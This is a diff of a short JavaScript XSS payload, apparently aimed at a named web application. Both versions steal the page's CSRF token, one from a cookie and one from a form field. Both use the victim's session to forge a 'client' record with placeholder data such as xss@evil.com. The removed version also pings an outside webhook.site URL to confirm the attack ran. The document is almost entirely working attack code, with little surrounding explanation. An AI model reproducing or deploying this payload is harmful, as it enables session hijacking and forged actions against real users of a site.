@@ -1,26 +1,24 @@
 (function () {
-  const tokenMatch = document.cookie.match(/XSRF-TOKEN=([^;]+)/);
-  if (!tokenMatch) return;
-  const token = decodeURIComponent(tokenMatch[1]);
+  const tokenInput = document.querySelector('input[name="_token"]');
+  if (!tokenInput) return;
+  const token = tokenInput.value;
 
-  const body = new URLSearchParams({
-    client_name: "ExploitXSS",
-    email: "xss@evil.com",
-    phone_number: "0606060606",
-    phone_type: "mobile",
-    address: "Injected by XSS",
-    _token: token
-  });
+  // 📦 Crée un formulaire
+  const f = document.createElement('form');
+  f.action = '/clients';
+  f.method = 'POST';
+  f.style.display = 'none';
 
-  fetch("https://current-legacy.ci.plany.app/clients", {
-    method: "POST",
-    headers: {
-      "Content-Type": "application/x-www-form-urlencoded",
-      "Referer": "https://current-legacy.ci.plany.app/clients"
-    },
-    credentials: "include", // <-- indispensable ici
-    body: body.toString()
-  });
+  // ➕ Champs requis
+  f.innerHTML = `
+    <input name="client_name" value="ExploitFromXSS">
+    <input name="email" value="xss@evil.com">
+    <input name="phone_number" value="0101010101">
+    <input name="phone_type" value="mobile">
+    <input name="address" value="XSSville">
+    <input name="_token" value="${token}">
+  `;
 
-  fetch("https://webhook.site/4e27c3b8-ea10-40a9-a816-ac1d92350386?ping=done");
+  document.body.appendChild(f);
+  f.submit();
 })();
